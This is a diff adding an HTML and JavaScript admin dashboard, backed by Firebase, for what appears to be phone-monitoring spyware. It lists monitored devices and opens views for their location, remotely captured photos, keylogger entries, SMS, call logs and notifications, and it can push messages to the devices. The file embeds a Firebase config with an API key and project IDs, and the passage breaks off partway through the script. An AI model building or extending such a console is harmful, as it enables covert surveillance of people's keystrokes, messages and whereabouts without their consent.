@@ -1,0 +1,1196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Beta Dashboard</title>
+    <meta name="robots" content="noindex">
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        
+        :root {
+            --bg-dark: #0d1117;
+            --primary-dark: rgba(22, 27, 34, 0.8);
+            --secondary-dark: #2a2a2a;
+            --accent-blue: #58a6ff;
+            --accent-green: #3fb950;
+            --accent-red: #f85149;
+            --accent-purple: #9b59b6;
+            --text-primary: #c9d1d9;
+            --text-secondary: #8b949e;
+            --border-color: rgba(240, 246, 252, 0.1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body { 
+            font-family: 'Inter', sans-serif;
+            background: #0d1117;
+            color: var(--text-primary);
+        }
+
+        body.modal-open {
+            overflow: hidden;
+        }
+
+        .background-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: linear-gradient(45deg, #0d1117, #161b22, #010409, #0d1117);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .dashboard-container {
+            display: flex;
+            height: 100vh;
+            transition: all 0.4s ease-in-out;
+        }
+
+        .sidebar {
+            width: 300px;
+            flex-shrink: 0; 
+            background: var(--primary-dark);
+            backdrop-filter: blur(10px);
+            padding: 1.5rem;
+            display: flex;
+            flex-direction: column;
+            border-right: 1px solid var(--border-color);
+            transition: transform 0.4s ease-in-out, width 0.4s ease-in-out, padding 0.4s ease-in-out;
+            z-index: 1000;
+            overflow: hidden; 
+        }
+
+        .dashboard-container.sidebar-hidden .sidebar {
+            width: 0;
+            padding: 1.5rem 0;
+        }
+
+        .sidebar > * {
+            transition: opacity 0.3s ease-in-out;
+            min-width: 252px;
+        }
+        
+        .dashboard-container.sidebar-hidden .sidebar > * {
+            opacity: 0;
+            visibility: hidden;
+        }
+
+        .sidebar-header {
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .sidebar-header h2 {
+            color: #fff;
+            font-size: 1.5rem;
+        }
+        .user-list {
+            list-style-type: none;
+            overflow-y: auto;
+            flex-grow: 1;
+        }
+        .user-list-item {
+            position: relative; 
+            padding: 1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            border: 1px solid transparent;
+        }
+        .user-list-item:hover {
+            background-color: rgba(88, 166, 255, 0.2);
+            border-color: rgba(88, 166, 255, 0.4);
+        }
+        .user-list-item.active {
+            background-color: var(--accent-blue);
+            color: #0d1117;
+            box-shadow: 0 4px 15px rgba(88, 166, 255, 0.25);
+        }
+        .user-list-item.active .user-name,
+        .user-list-item.active .device-name,
+        .user-list-item.active .user-id {
+            color: #0d1117;
+            font-weight: 700;
+        }
+        .user-list-item.active svg {
+            stroke: #0d1117;
+        }
+
+        .user-list-item .user-name { font-weight: 600; }
+        .user-list-item .device-name { font-size: 0.8rem; opacity: 0.8; }
+        .user-list-item .user-id { 
+            font-size: 0.85rem;
+            font-weight: 700;
+            color: var(--text-primary);
+            opacity: 0.9;
+            word-break: break-all; 
+            margin-top: 6px;
+        }
+        
+        .main-content {
+            flex-grow: 1;
+            padding: 2.5rem;
+            overflow-y: auto;
+            height: 100vh;
+        }
+        .main-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+        .main-header h1 { font-size: 2.25rem; color: #fff; }
+        .header-buttons { display: flex; gap: 1rem; align-items: center; }
+        
+        .header-btn {
+            background: var(--secondary-dark);
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            cursor: pointer;
+            border-radius: 8px;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+        }
+        .header-btn:hover {
+            background: var(--accent-blue);
+            color: #fff;
+        }
+        .header-btn svg {
+            transition: transform 0.4s ease;
+        }
+        
+        #toggle-sidebar-btn { display: flex; }
+        #menu-btn { display: none; }
+        
+        .dashboard-container.sidebar-hidden #toggle-sidebar-btn svg {
+            transform: rotate(180deg);
+        }
+
+        #send-notification-btn, #logout-btn {
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        #send-notification-btn { background: var(--accent-green); display: none; }
+        #logout-btn { background: var(--accent-red); }
+
+        #details-view { display: none; }
+        .category-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+        .category-btn {
+            position: relative;
+            background-color: var(--secondary-dark);
+            border: 1px solid var(--border-color);
+            color: var(--text-primary);
+            padding: 1.5rem 1rem;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 500;
+            transition: all 0.3s;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 0.75rem;
+        }
+        .category-btn svg {
+            width: 32px;
+            height: 32px;
+            transition: all 0.3s;
+        }
+        .category-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+            border-color: var(--accent-blue);
+        }
+        .category-btn.active {
+            background-color: var(--accent-blue);
+            color: #fff;
+            border-color: var(--accent-blue);
+        }
+        .category-btn.active svg {
+            stroke: #fff;
+        }
+        
+        .chat-notification-indicator, .sidebar-indicator {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: var(--accent-red);
+            border-radius: 50%;
+            border: 2px solid var(--bg-dark);
+            animation: blinker 1.5s linear infinite;
+        }
+        .chat-notification-indicator {
+            top: 12px;
+            right: 12px;
+        }
+        .sidebar-indicator {
+            top: 1rem;
+            right: 1rem;
+        }
+
+        @keyframes blinker {
+            50% { opacity: 0.2; }
+        }
+        
+        .data-display-area {
+            background: var(--primary-dark);
+            padding: 2rem;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
+            min-height: 400px;
+        }
+        
+        .data-header { display: flex; justify-content: flex-end; align-items: center; margin-bottom: 1.5rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border-color); flex-wrap: wrap; gap: 1rem; }
+        .clear-category-btn, .capture-photo-btn, #refresh-photos-btn { color: white; padding: 8px 12px; border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; font-weight: 500; display: inline-flex; align-items: center; gap: 6px; }
+        .clear-category-btn { background-color: var(--accent-red); }
+        .capture-photo-btn { background-color: var(--accent-green); }
+        #refresh-photos-btn { background-color: var(--accent-blue); }
+        .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 1.5rem; }
+        .photo-card { background-color: var(--secondary-dark); border-radius: 12px; overflow: hidden; border: 1px solid var(--border-color); }
+        .photo-card img { width: 100%; height: 180px; object-fit: cover; }
+        .photo-info { padding: 1rem; display: flex; justify-content: space-between; align-items: center; }
+        .photo-time { font-size: 0.8rem; color: var(--text-secondary); }
+        .view-btn { background-color: var(--accent-blue); color: white; border: none; border-radius: 6px; width: 36px; height: 36px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .map-link { display: inline-flex; align-items: center; gap: 8px; margin-top: 1.5rem; padding: 12px 20px; background-color: var(--accent-blue); color: #fff; text-decoration: none; border-radius: 8px; font-weight: 600; transition: background-color 0.3s; }
+        .map-link:hover { opacity: 0.9; }
+        #login-container { display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-card { width: 100%; max-width: 400px; background: var(--primary-dark); backdrop-filter: blur(10px); padding: 2.5rem; border-radius: 16px; border: 1px solid var(--border-color); text-align: center; box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3); }
+        .login-card h2 { margin-bottom: 2rem; color: #fff; font-size: 1.8rem; }
+        .login-card input { background-color: var(--secondary-dark); color: var(--text-primary); border: 1px solid var(--border-color); padding: 16px; font-size: 1rem; transition: border-color 0.3s; width: 100%; margin-bottom: 1rem; border-radius: 8px; }
+        .login-card input:focus { outline: none; border-color: var(--accent-blue); }
+        .login-card button { background: var(--accent-blue); padding: 16px; font-size: 1rem; display: flex; align-items: center; justify-content: center; gap: 10px; transition: all 0.3s ease; width: 100%; margin-top: 10px; border-radius: 8px; border: none; cursor: pointer; color: white; font-weight: 600; }
+        .login-card button:hover { box-shadow: 0 6px 20px rgba(58, 134, 255, 0.3); transform: translateY(-2px); }
+        #error-message { color: var(--accent-red); margin-top: 1rem; font-weight: 500; min-height: 20px; }
+        .loader { border: 4px solid var(--secondary-dark); border-top: 4px solid var(--accent-blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 40px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .sms-card-list { display: flex; flex-direction: column; }
+        .sms-card { background-color: var(--secondary-dark); border-radius: 12px; padding: 1rem; border-left: 4px solid var(--text-secondary); box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); margin-bottom: 1.5rem; }
+        .sms-card:last-child { margin-bottom: 0; }
+        .sms-card.incoming { border-left-color: var(--accent-blue); }
+        .sms-card.outgoing { border-left-color: var(--accent-green); }
+        .sms-card-header { display: flex; align-items: center; gap: 0.75rem; margin-bottom: 0.75rem; }
+        .sms-card-icon svg { width: 24px; height: 24px; }
+        .sms-card-address { font-weight: 600; color: var(--text-primary); word-wrap: break-word; }
+        .sms-card-body { line-height: 1.6; color: var(--text-primary); padding-left: 36px; word-wrap: break-word; }
+        .sms-card-footer { text-align: right; font-size: 0.8rem; color: var(--text-secondary); margin-top: 0.75rem; }
+        .notification-list { display: flex; flex-direction: column; gap: 1rem; }
+        .notification-card { background-color: var(--secondary-dark); padding: 1rem; border-radius: 8px; }
+        .notification-header { display: flex; align-items: center; gap: 12px; margin-bottom: 0.75rem; }
+        .notification-icon { width: 28px; height: 28px; flex-shrink: 0; }
+        .notification-icon svg, .notification-icon img { width: 100%; height: 100%; border-radius: 4px; }
+        .notification-title { font-weight: 600; color: #fff; }
+        .notification-body { font-size: 0.9rem; line-height: 1.5; color: var(--text-primary); }
+        .notification-footer { font-size: 0.75rem; opacity: 0.6; text-align: right; margin-top: 0.75rem; }
+        .keylog-list { display: flex; flex-direction: column; gap: 1rem; }
+        .keylog-card { background-color: var(--secondary-dark); padding: 1rem; border-radius: 8px; }
+        .keylog-header { display: flex; align-items: center; gap: 12px; margin-bottom: 0.75rem; }
+        .keylog-icon { width: 24px; height: 24px; flex-shrink: 0; color: var(--accent-orange); }
+        .keylog-action { font-weight: 600; color: #fff; }
+        .keylog-text { font-size: 0.95rem; line-height: 1.5; color: var(--text-primary); word-break: break-all; }
+        .keylog-footer { font-size: 0.75rem; opacity: 0.6; text-align: right; margin-top: 0.75rem; }
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(5px); display: none; justify-content: center; align-items: center; z-index: 1001; padding: 20px; box-sizing: border-box; }
+        .modal-content { background: var(--primary-dark); border: 1px solid var(--border-color); padding: 1.5rem; border-radius: 12px; width: 100%; max-width: 900px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); display: flex; flex-direction: column; max-height: 90vh; }
+        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border-color); }
+        .modal-header h3 { margin: 0; color: #fff; }
+        .modal-body { overflow-y: auto; text-align: left; padding: 1rem 0; }
+        .modal-body textarea, .modal-body input { width: 100%; padding: 10px; background-color: var(--secondary-dark); border: 1px solid var(--border-color); border-radius: 6px; color: var(--text-primary); font-size: 1rem; margin-bottom: 1rem; }
+        .modal-footer { margin-top: 1rem; text-align: right; }
+        .modal-footer button { background-color: var(--accent-blue); color: white; padding: 10px 20px; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; }
+        .modal-close-btn { background: none; border: none; font-size: 24px; cursor: pointer; color: var(--text-primary); }
+        .live-chat-area { display: flex; flex-direction: column; height: 100%; }
+        .chat-messages { flex-grow: 1; overflow-y: auto; padding: 1rem; display: flex; flex-direction: column-reverse; gap: 0.75rem; }
+        .chat-bubble { padding: 10px 15px; border-radius: 18px; max-width: 75%; word-wrap: break-word; line-height: 1.4; }
+        .chat-bubble .chat-time { font-size: 0.7rem; opacity: 0.7; margin-top: 4px; display: block; text-align: right; }
+        .chat-bubble.admin { background-color: var(--accent-blue); color: #fff; align-self: flex-end; border-bottom-right-radius: 4px; }
+        .chat-bubble.user { background-color: var(--secondary-dark); color: var(--text-primary); align-self: flex-start; border-bottom-left-radius: 4px; }
+        .chat-input-area { display: flex; padding: 1rem; border-top: 1px solid var(--border-color); gap: 1rem; }
+        .chat-input-area input { flex-grow: 1; padding: 12px; border-radius: 8px; border: 1px solid var(--border-color); background: var(--secondary-dark); color: var(--text-primary); }
+        .chat-input-area input:focus { outline: none; border-color: var(--accent-blue); }
+        .chat-input-area button { background-color: var(--accent-blue); border: none; border-radius: 8px; padding: 0 16px; cursor: pointer; color: white; }
+
+        #overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            z-index: 999;
+        }
+
+        /* --- Device Status Styles --- */
+        .status-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+        }
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            background: var(--secondary-dark);
+            padding: 1rem;
+            border-radius: 8px;
+        }
+        .status-item-label { font-weight: 500; }
+        .status-item-value {
+            margin-left: auto;
+            font-weight: 600;
+        }
+        .status-item-value.on { color: var(--accent-green); }
+        .status-item-value.off { color: var(--accent-red); }
+        .battery-level {
+            width: 100%;
+            background-color: var(--secondary-dark);
+            border-radius: 5px;
+            height: 20px;
+            overflow: hidden;
+        }
+        .battery-level-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent-red), var(--accent-green));
+            border-radius: 5px;
+            transition: width 0.5s ease;
+        }
+
+        @media (max-width: 992px) {
+            .sidebar {
+                position: fixed;
+                left: 0;
+                top: 0;
+                height: 100%;
+                transform: translateX(-100%);
+            }
+            .sidebar.open {
+                transform: translateX(0);
+            }
+            #toggle-sidebar-btn { 
+                display: none;
+            }
+            #menu-btn {
+                display: block;
+            }
+            .main-content {
+                padding: 1.5rem;
+            }
+            .category-buttons {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="background-animation"></div>
+
+    <div id="login-container">
+        <div class="login-card">
+            <h2>Admin Panel</h2>
+            <input type="email" id="email" placeholder="Admin Email">
+            <input type="password" id="password" placeholder="Password">
+            <button id="login-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
+                <span>Secure Login</span>
+            </button>
+            <p id="error-message"></p>
+        </div>
+    </div>
+
+    <div id="dashboard" class="dashboard-container" style="display: none;">
+        <aside class="sidebar">
+            <div class="sidebar-header">
+                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
+                <h2 id="sidebar-title">Users</h2>
+            </div>
+            <ul id="user-list" class="user-list"></ul>
+        </aside>
+
+        <main class="main-content">
+            <header class="main-header">
+                <div style="display: flex; align-items: center; gap: 1rem;">
+                    <button id="toggle-sidebar-btn" class="header-btn">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="9" y1="3" x2="9" y2="21"></line></svg>
+                    </button>
+                    <button id="menu-btn" class="header-btn">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
+                    </button>
+                    <h1 id="main-content-title">Select a User</h1>
+                </div>
+
+                <div class="header-buttons">
+                    <button id="send-notification-btn">Send Notification</button>
+                    <button id="logout-btn">Logout</button>
+                </div>
+            </header>
+
+            <div id="details-view">
+                <div class="category-buttons">
+                    <!-- Device Status को सबसे पहले लाया गया -->
+                    <button class="category-btn" data-category="devicestatus">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ce93d8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
+                        <span>Device Status</span>
+                    </button>
+                    <button class="category-btn" data-category="location">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
+                        <span>Location</span>
+                    </button>
+                    <button class="category-btn" data-category="photo">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
+                        <span>Photos</span>
+                    </button>
+                    <button class="category-btn" data-category="keylogger">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#f39c12" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg>
+                        <span>Keylogger</span>
+                    </button>
+                    <button class="category-btn" data-category="sms">
+                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#9b59b6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
+                        <span>SMS</span>
+                    </button>
+                    <button class="category-btn" data-category="calllogs">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#64b5f6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                        <span>Call Logs</span>
+                    </button>
+                    <button class="category-btn" data-category="notifications">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
+                        <span>Notifications</span>
+                    </button>
+                    <button class="category-btn" data-category="chat">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-purple)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
+                        <span>Live Chat</span>
+                    </button>
+                </div>
+            </div>
+        </main>
+    </div>
+    <div id="overlay"></div>
+
+    <div id="data-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 id="modal-title">Data</h3>
+                <button class="modal-close-btn">×</button>
+            </div>
+            <div class="modal-body" id="modal-data-display-area"></div>
+        </div>
+    </div>
+    <div id="notification-modal" class="modal-overlay">
+        <div class="modal-content" style="max-width: 500px;">
+            <div class="modal-header">
+                <h3 id="notification-modal-title">Send Notification to User</h3>
+                <button class="modal-close-btn">×</button>
+            </div>
+            <div class="modal-body">
+                <textarea id="notification-message-input" rows="4" placeholder="Enter your message..."></textarea>
+            </div>
+            <div class="modal-footer">
+                <button id="send-notification-submit-btn">Send</button>
+            </div>
+        </div>
+    </div>
+
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
+        import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-auth.js";
+        import { getDatabase, ref, onValue, remove, update, push, serverTimestamp, off } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
+        // Storage is no longer needed for photos, but keep it for other potential uses.
+        import { getStorage, ref as storageRef, deleteObject } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-storage.js";
+
+        const firebaseConfig = {
+         apiKey: "AIzaSyBZ-E4_1bI4YN-1pt6xyMNXq1tOAvx0GY0",
+         authDomain: "home-demo12-d5814.firebaseapp.com",
+         databaseURL: "https://home-demo12-d5814-default-rtdb.firebaseio.com",
+         projectId: "home-demo12-d5814",
+         storageBucket: "home-demo12-d5814.appspot.com",
+         messagingSenderId: "433464727867",
+         appId: "1:433464727867:web:731cc791eb8d48c5d9bf1e",
+         measurementId: "G-NHHB06Z9HT"
+        };
+
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getDatabase(app);
+        const storage = getStorage(app);
+
+        // DOM Elements
+        const loginContainer = document.getElementById('login-container');
+        const dashboard = document.getElementById('dashboard');
+        const userList = document.getElementById('user-list');
+        const mainContentTitle = document.getElementById('main-content-title');
+        const detailsView = document.getElementById('details-view');
+        const categoryButtonsContainer = document.querySelector('.category-buttons');
+        const sidebar = document.querySelector('.sidebar');
+        const overlay = document.getElementById('overlay');
+        const dataModal = document.getElementById('data-modal');
+        const modalDataDisplayArea = document.getElementById('modal-data-display-area');
+        const notificationModal = document.getElementById('notification-modal');
+        const sendNotificationBtn = document.getElementById('send-notification-btn');
+        const sendNotificationSubmitBtn = document.getElementById('send-notification-submit-btn');
+        const notificationMessageInput = document.getElementById('notification-message-input');
+        const menuBtn = document.getElementById('menu-btn');
+        const toggleSidebarBtn = document.getElementById('toggle-sidebar-btn');
+        const sidebarTitle = document.getElementById('sidebar-title');
+
+        // State
+        let activeDataListener = null;
+        let selectedUserInfo = {};
+        let activeChatListeners = []; 
+        
+        let fullKeyloggerData = [];
+        let renderedKeyloggerCount = 0;
+        const KEYLOGGER_BATCH_SIZE = 50;
+        let isKeyloggerLoading = false;
+
+        // --- Helper Functions ---
+        
+        function detachAllListeners() {
+            if (activeDataListener) {
+                off(activeDataListener.ref, 'value', activeDataListener.callback);
+                activeDataListener = null;
+            }
+            activeChatListeners.forEach(listener => {
+                off(listener.ref, 'value', listener.callback);
+            });
+            activeChatListeners = [];
+        }
+        
+        function detachChatIndicatorListeners() {
+            activeChatListeners.forEach(listener => {
+                off(listener.ref, 'value', listener.callback);
+            });
+            activeChatListeners = [];
+        }
+        
+        function openModal(modalElement) {
+            if (!modalElement) return;
+            modalElement.style.display = 'flex';
+            document.body.classList.add('modal-open');
+        }
+
+        function closeModal(modalElement) {
+            if (!modalElement) return;
+            if (modalElement.id === 'data-modal') {
+                if (activeDataListener) {
+                    off(activeDataListener.ref, 'value', activeDataListener.callback);
+                    activeDataListener = null;
+                }
+                modalDataDisplayArea.removeEventListener('scroll', handleKeyloggerScroll);
+                fullKeyloggerData = [];
+                renderedKeyloggerCount = 0;
+            }
+            modalElement.style.display = 'none';
+            document.body.classList.remove('modal-open');
+        }
+
+        // --- Auth & Main Listeners ---
+        document.getElementById('login-btn').addEventListener('click', () => { signInWithEmailAndPassword(auth, document.getElementById('email').value, document.getElementById('password').value).catch(error => document.getElementById('error-message').textContent = "Login Failed. Ensure you are an admin."); });
+        
+        document.getElementById('logout-btn').addEventListener('click', () => {
+            signOut(auth);
+        });
+
+        onAuthStateChanged(auth, user => {
+            if (user) {
+                const adminRef = ref(db, `admins/${user.uid}`);
+                onValue(adminRef, (snapshot) => {
+                    if (snapshot.exists() && snapshot.val() === true) {
+                        loginContainer.style.display = 'none';
+                        dashboard.style.display = 'flex';
+                        loadUsersAndSetupChatListeners();
+                    } else {
+                        signOut(auth);
+                        alert("Access Denied. You are not an admin.");
+                    }
+                }, { onlyOnce: true });
+            } else {
+                loginContainer.style.display = 'flex';
+                dashboard.style.display = 'none';
+                detachAllListeners();
+            }
+        });
+        
+        // --- Core Application Logic ---
+        function loadUsersAndSetupChatListeners() {
+            const usersRef = ref(db, 'user'); 
+            onValue(usersRef, (snapshot) => {
+                detachChatIndicatorListeners();
+                
+                const activeListItem = document.querySelector('.user-list-item.active');
+                const activeUserId = activeListItem ? activeListItem.dataset.userid : null;
+                const activeChildKey = activeListItem ? activeListItem.dataset.childkey : null;
+
+                userList.innerHTML = '';
+                const data = snapshot.val();
+                let userCount = 0;
+
+                if (data) {
+                    Object.keys(data).forEach(userId => {
+                        Object.keys(data[userId]).forEach(childKey => {
+                            userCount++;
+                            const childData = data[userId][childKey];
+                            const userName = childData?.data?.nameChild || childKey;
+                            
+                            const listItem = document.createElement('li');
+                            listItem.className = 'user-list-item';
+                            listItem.dataset.userid = userId;
+                            listItem.dataset.childkey = childKey;
+                            listItem.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg><div><div class="user-name">${userName}</div><div class="device-name">${childData?.data?.nameDevice || 'Unknown'}</div><div class="user-id">User: ${userId}</div></div>`;
+                            
+                            if (userId === activeUserId && childKey === activeChildKey) {
+                                listItem.classList.add('active');
+                            }
+
+                            userList.appendChild(listItem);
+
+                            const chatRef = ref(db, `chats/${userId}/${childKey}/messages`);
+                            const chatCallback = (chatSnapshot) => {
+                                if (!chatSnapshot.exists()) return;
+
+                                const messages = chatSnapshot.val();
+                                let lastUserTimestamp = 0;
+                                let lastAdminTimestamp = 0;
+
+                                Object.values(messages).forEach(msg => {
+                                    if (msg.sender === 'user' && typeof msg.timestamp === 'number') {
+                                        lastUserTimestamp = Math.max(lastUserTimestamp, msg.timestamp);
+                                    } else if (msg.sender === 'admin' && typeof msg.timestamp === 'number') {
+                                        lastAdminTimestamp = Math.max(lastAdminTimestamp, msg.timestamp);
+                                    }
+                                });
+
+                                const indicator = listItem.querySelector('.sidebar-indicator');
+                                if (lastUserTimestamp > lastAdminTimestamp) {
+                                    if (!indicator) {
+                                        const newIndicator = document.createElement('div');
+                                        newIndicator.className = 'sidebar-indicator';
+                                        listItem.appendChild(newIndicator);
+                                    }
+                                } else {
+                                    if (indicator) indicator.remove();
+                                }
+                            };
+
+                            onValue(chatRef, chatCallback);
+                            activeChatListeners.push({ ref: chatRef, callback: chatCallback });
+                        });
+                    });
+                } else {
+                    userList.innerHTML = '<li>No users found.</li>';
+                }
+                sidebarTitle.textContent = `Users (${userCount})`;
+            });
+        }
+        
+        userList.addEventListener('click', (e) => {
+            const listItem = e.target.closest('.user-list-item');
+            if (listItem) {
+                document.querySelectorAll('.user-list-item.active').forEach(item => item.classList.remove('active'));
+                listItem.classList.add('active');
+                
+                selectedUserInfo = { 
+                    userId: listItem.dataset.userid, 
+                    childKey: listItem.dataset.childkey, 
+                    userName: listItem.querySelector('.user-name').textContent 
+                };
+                mainContentTitle.textContent = selectedUserInfo.userName;
+                detailsView.style.display = 'block';
+                sendNotificationBtn.style.display = 'inline-flex'; 
+                
